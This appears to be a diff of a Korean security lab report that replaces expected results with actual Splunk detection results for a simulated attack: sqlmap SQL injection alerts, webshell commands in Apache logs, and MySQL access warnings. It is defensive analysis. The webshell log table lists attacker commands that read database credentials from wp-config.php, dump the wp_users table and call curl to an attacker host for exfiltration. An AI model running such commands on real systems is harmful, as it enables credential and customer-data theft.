@@ -608,49 +608,50 @@ Snort     | 8     (pfSense SID 1000002 "brute-force attempt" 경보)
 #### 상관분석 2. SQLi 다중 소스 교차 검증
 
 ```spl
-(index=pfsense ("SQL" OR "SQLI" OR "sql injection") src_ip=*)
-  OR (index=idx_waf "942" src_ip=*)
+index=pfsense ("SQL" OR "1000004")
 | eval layer=case(
-    index="pfsense" AND match(_raw,"ET WEB_SERVER"), "Snort/ET",
-    index="pfsense" AND match(_raw,"LOCAL"), "Snort/커스텀",
-    index="idx_waf", "ModSecurity")
-| eval attacker=coalesce(src_ip, clientip)
-| stats count by attacker, layer
-| where count > 3
-| sort -count
+    like(_raw,"%1000004%"), "Snort/커스텀",
+    like(_raw,"%ET WEB_SERVER%"), "Snort/ET",
+    true(), "Snort/기타")
+| stats count by layer
 ```
 
-**예상 결과:**
+**실제 결과 (21 이벤트):**
 ```
-공격자 IP       | 탐지 계층     | 경보 수
-10.50.50.30     | Snort/ET      | 18   (ET SQL Injection 룰)
-10.50.50.30     | ModSecurity   | 확인 필요 (942xxx 룰)
+탐지 계층      | 경보 수 | 탐지 룰 상세
+Snort/ET       | 18      | ET WEB_SERVER SQL Injection (UNION SELECT, WAITFOR DELAY, Sleep Time Delay, SHOW TABLES)
+Snort/커스텀    | 3       | LOCAL SQL Injection attempt UNION SELECT (pfSense SID 1000004)
 ```
-> ModSecurity가 DetectionOnly 모드이므로 로그만 기록, 차단은 안 됨.
+> **분석:** sqlmap이 다양한 SQLi 기법을 시도하여 ET Open 룰 18건 + 커스텀 룰 3건, 총 21건 탐지.
+> ET 룰이 WAITFOR DELAY(시간 기반), Sleep Time Delay(블라인드), UNION SELECT, SHOW TABLES 등 다양한 패턴을 각각 탐지.
+> 커스텀 룰(SID 1000004)은 UNION SELECT 패턴만 탐지하므로 ET 룰이 더 넓은 범위를 커버.
 
 ---
 
-#### 상관분석 3. 웹쉘 업로드 → 실행 시퀀스 탐지
+#### 상관분석 3. 웹쉘 명령 실행 시퀀스 탐지
 
 ```spl
-index=idx_web sourcetype="apache:access"
-  (uri="*cmd=*" OR uri="*/uploads/*.php" OR uri="*/uploads/*.phtml")
-| eval phase=case(
-    method="POST" AND match(uri,"uploads"), "업로드 시도",
-    match(uri,"cmd="), "명령 실행",
-    true(), "접근")
-| stats count values(uri) as uri_list by clientip, phase
-| sort -count
-| rename clientip as "공격자 IP"
+index=idx_web "cmd="
+| stats count by source
 ```
 
-**예상 결과:**
+**실제 결과 (37 이벤트, source=tcp:9514, host=wordpress):**
 ```
-공격자 IP       | 단계       | 접근 수 | URI 목록
-10.50.50.30     | 명령 실행   | 다수    | /?cmd=id, /?cmd=whoami, /?cmd=hostname 등
+시각 (KST)     | 실행 명령                    | HTTP 응답 | 설명
+18:03~18:04    | cmd=id                       | 200 213   | 권한 확인 (www-data)
+18:04          | cmd=hostname                  | 200 169   | 호스트명 확인
+18:04          | cmd=ip+addr                   | 200 852   | 네트워크 정보 수집
+18:04          | cmd=grep+DB_+.../wp-config.php | 200 396   | DB 인증정보 탈취
+18:09          | cmd=which+mysql               | 200 174   | mysql CLI 존재 확인
+18:08~18:10   | cmd=mysql+...+SHOW+DATABASES   | 200 355   | DB 목록 조회
+18:11          | cmd=mysql+...+SHOW+TABLES      | 200 474   | 테이블 목록 조회
+18:14~18:19   | cmd=mysql+...+SELECT+*+FROM+wp_customers | 200 | 고객 데이터 조회
+18:19~18:20   | cmd=mysql+...+SELECT+user_login,user_email,user_pass+FROM+wp_users | 200 391 | 사용자 정보 탈취
+18:21          | cmd=curl+http://10.50.50.30:8888/exfil | 200 573 | 외부 유출 시도 (실패)
 ```
-> 참고: 실제 웹쉘은 hello.php(/?cmd=)를 사용했으므로 uploads/*.phtml 패턴은 미매칭.
-> 쿼리를 `uri="*cmd=*"` 로 수정하여 실제 경로에 맞게 조정 필요.
+> **분석:** Apache access log에 웹쉘 명령이 GET 파라미터로 그대로 기록됨.
+> 공격자(10.50.50.30)가 curl/8.21.0으로 약 18분간 체계적으로 내부 정찰 → DB 탈취 → 유출 시도 수행.
+> 모든 요청이 HTTP 200 — 웹쉘이 정상 응답으로 명령 결과를 반환했음을 의미.
 
 ---
 
@@ -726,13 +727,19 @@ index=idx_db (sourcetype="mysql:slow" OR sourcetype="mysql:error")
 | where is_external="DMZ(비정상)"
 ```
 
-**예상 결과:**
+**실제 결과 (347 이벤트, host=mysql, source=tcp:9516):**
+```spl
+index=idx_db host=mysql
 ```
-접근 호스트     | 분류          | DB 사용자 | 쿼리 수
-10.0.10.80      | DMZ(비정상)    | wp_admin  | 확인 필요
 ```
-> 참고: 웹쉘에서 mysql CLI로 실행한 SHOW TABLES, SELECT FROM wp_users 등이 기록되어야 함.
-> MySQL slow query log에 기록되려면 long_query_time 이하 설정 필요 — error log에는 접속 이력만 남음.
+로그 유형     | 건수 | 내용
+mysql-error   | 347  | [Warning] [MY-010055] IP address '10.0.10.80' could not be resolved: Temporary failure in name resolution
+```
+> **분석:** MySQL 서버(10.0.100.60)가 WordPress(10.0.10.80)의 접속을 347회 기록.
+> 모든 로그가 동일한 Warning — DMZ IP(10.0.10.80)의 역방향 DNS 조회 실패.
+> 이는 **웹쉘에서 mysql CLI로 DB 접근할 때마다 MySQL이 클라이언트 IP의 DNS를 조회**하기 때문.
+> 쿼리 내용(SHOW TABLES, SELECT 등)은 error log에는 기록되지 않지만, **접속 자체가 비정상** — DMZ 서버에서 DB 직접 접근은 정상 웹 애플리케이션 동작이 아닌 수동 CLI 접근을 의미.
+> MySQL Audit Plugin 활성화 시 실제 쿼리 내용까지 기록 가능.
 
 ---
 
